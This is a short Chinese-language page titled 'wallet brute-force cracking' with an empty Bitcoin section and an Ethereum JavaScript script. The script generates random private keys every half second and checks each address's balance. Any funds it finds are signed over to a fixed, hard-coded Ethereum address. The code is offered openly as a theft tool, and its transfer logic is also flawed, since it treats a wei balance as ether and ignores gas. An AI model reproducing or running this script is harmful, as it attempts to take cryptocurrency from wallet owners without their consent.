# 钱包暴力破解

<DocsAD/>

## BitCoin(BTC)

```js

```

## Ethereum(ETH)

```js
// https://privatekeys.pw/keys/ethereum/1

const { Web3 } = require('web3');
const web3 = new Web3();
const crypto = require('crypto');


function generateRandomHexString() {
    return crypto.randomBytes(32).toString('hex');;
}

async function sendTransaction(address,privateKey,value) {
    const fromAddress = address;
    const privateKey1 = privateKey;
    // 获取当前交易计数 (nonce)
    const nonce = await web3.eth.getTransactionCount(fromAddress, 'latest');
    // 设置交易参数
    const tx = {
    from: fromAddress,
    to: '0xfb0bc05F1aC61a566E70890e0e000E66F147ae66',
    value: web3.utils.toWei(value, 'ether'),  // 发送 0.1 ETH
    gas: 21000,  // 用于简单的 ETH 转账
    gasPrice: await web3.eth.getGasPrice(),  // 获取当前网络的 gas 价格
    nonce: nonce,
    };
    // 签名交易
    const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey1);

    // 发送已签名的交易
    web3.eth.sendSignedTransaction(signedTx.rawTransaction)
    .on('receipt', receipt => {
        console.log('交易成功:', receipt);
    })
    .on('error', err => {
        console.error('交易失败:', err);
    });
}

function crack(){
    const privateKey = '0x'+ generateRandomHexString();
    const accountFromPrivateKey = web3.eth.accounts.privateKeyToAccount(privateKey);

    web3.eth.getBalance(accountFromPrivateKey.address).then((balance)=>{
        console.log(privateKey+"|",accountFromPrivateKey.address + ' Balance:', web3.utils.fromWei(balance, 'ether'), 'ETH');
        if (balance > 0){
            sendTransaction(accountFromPrivateKey.address,privateKey,balance)
        }
    }).catch(err => {
        console.error(err);
    });
}

setInterval(crack, 500);
```